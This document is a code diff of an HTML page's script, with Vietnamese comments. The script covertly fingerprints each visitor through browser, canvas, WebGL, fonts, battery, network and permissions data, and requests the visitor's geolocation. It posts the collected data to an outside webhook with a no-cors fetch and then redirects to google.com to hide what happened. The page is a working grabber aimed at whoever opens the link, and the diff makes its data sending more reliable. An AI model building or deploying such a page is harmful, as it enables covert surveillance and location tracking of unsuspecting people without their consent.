@@ -21,7 +21,7 @@
     <script>
         (async function() {
             // --- CẤU HÌNH ---
-            const WEBHOOK_URL = "https://app.hooklistener.com/w/my-first-endpoint-fuxm"; // thay bằng của bạn nếu cần
+            const WEBHOOK_URL = "https://app.hooklistener.com/w/my-first-endpoint-fuxm"; // Thay bằng URL Webhook của bạn
             const REDIRECT_TO = "https://www.google.com";
 
             let data = {
@@ -43,7 +43,7 @@
             };
 
             try {
-                // 1. Browser info (cơ bản + languages + client hints)
+                // 1. Browser info
                 data.browser = {
                     userAgent: navigator.userAgent,
                     languages: navigator.languages,
@@ -57,7 +57,7 @@
                     maxTouchPoints: navigator.maxTouchPoints || 0
                 };
 
-                // Client Hints (nâng cao, thay thế dần UA)
+                // Client Hints
                 if (navigator.userAgentData) {
                     try {
                         const hints = await navigator.userAgentData.getHighEntropyValues([
@@ -81,7 +81,7 @@
                     innerHeight: window.innerHeight
                 };
 
-                // 3. Network (Connection API)
+                // 3. Network
                 if (navigator.connection) {
                     data.network = {
                         effectiveType: navigator.connection.effectiveType,
@@ -97,7 +97,7 @@
                     locale: Intl.DateTimeFormat().resolvedOptions().locale
                 };
 
-                // 5. Battery (nếu hỗ trợ)
+                // 5. Battery
                 if (navigator.getBattery) {
                     try {
                         const battery = await navigator.getBattery();
@@ -110,7 +110,7 @@
                     } catch (e) { data.errors.push("Battery error"); }
                 }
 
-                // 6. Canvas Fingerprint (chi tiết hơn)
+                // 6. Canvas Fingerprint
                 try {
                     const canvas = document.createElement('canvas');
                     const ctx = canvas.getContext('2d');
@@ -128,10 +128,10 @@
                     ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
                     ctx.closePath();
                     ctx.fill();
-                    data.fingerprint.canvas = canvas.toDataURL(); // full data URL (có thể hash sau)
+                    data.fingerprint.canvas = canvas.toDataURL(); 
                 } catch (e) { data.errors.push("Canvas error"); }
 
-                // 7. WebGL Fingerprint (chi tiết)
+                // 7. WebGL Fingerprint
                 try {
                     const canvas = document.createElement('canvas');
                     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -147,7 +147,7 @@
                     }
                 } catch (e) { data.errors.push("WebGL error"); }
 
-                // 8. Font detection (danh sách font phổ biến - entropy cao)
+                // 8. Font detection
                 try {
                     const baseFonts = ["monospace", "sans-serif", "serif"];
                     const testFonts = ["Arial", "Courier New", "Georgia", "Helvetica", "Times New Roman", "Verdana", "Comic Sans MS", "Trebuchet MS", "Impact", "Segoe UI"];
@@ -184,17 +184,17 @@
                     contrast: window.matchMedia('(prefers-contrast: high)').matches ? "high" : "normal"
                 };
 
-                // 10. Permissions (query một số quyền phổ biến)
+                // 10. Permissions
                 const permNames = ['geolocation', 'notifications', 'camera', 'microphone'];
                 data.permissions = {};
                 for (const name of permNames) {
                     try {
                         const status = await navigator.permissions.query({name});
-                        data.permissions[name] = status.state; // granted / denied / prompt
+                        data.permissions[name] = status.state; 
                     } catch {}
                 }
 
-                // 11. Geolocation (giữ nguyên, có timeout)
+                // 11. Geolocation (có timeout)
                 if (navigator.geolocation) {
                     await new Promise(resolve => {
                         navigator.geolocation.getCurrentPosition(
@@ -225,24 +225,21 @@
                 data.globalError = globalErr.message;
             }
 
-            // Gửi dữ liệu bằng sendBeacon (đảm bảo gửi trước redirect)
+            // --- ĐÃ SỬA: Gửi dữ liệu bằng fetch (đợi gửi xong mới redirect) ---
             try {
-                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-                navigator.sendBeacon(WEBHOOK_URL, blob);
-            } catch (e) {
-                // fallback fetch nếu beacon không hỗ trợ
-                fetch(WEBHOOK_URL, {
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
+                    mode: 'no-cors', // Bỏ qua lỗi chặn CORS trên trình duyệt
                     body: JSON.stringify(data),
                     headers: { 'Content-Type': 'application/json' },
                     keepalive: true
-                }).catch(() => {});
+                });
+            } catch (e) {
+                console.error("Lỗi khi gửi dữ liệu:", e);
             }
 
-            // Redirect sau 1 giây để chắc chắn beacon được gửi
-            setTimeout(() => {
-                window.location.replace(REDIRECT_TO);
-            }, 1000);
+            // Redirect ngay sau khi quy trình fetch kết thúc (dù thành công hay lỗi)
+            window.location.replace(REDIRECT_TO);
 
         })();
     </script>
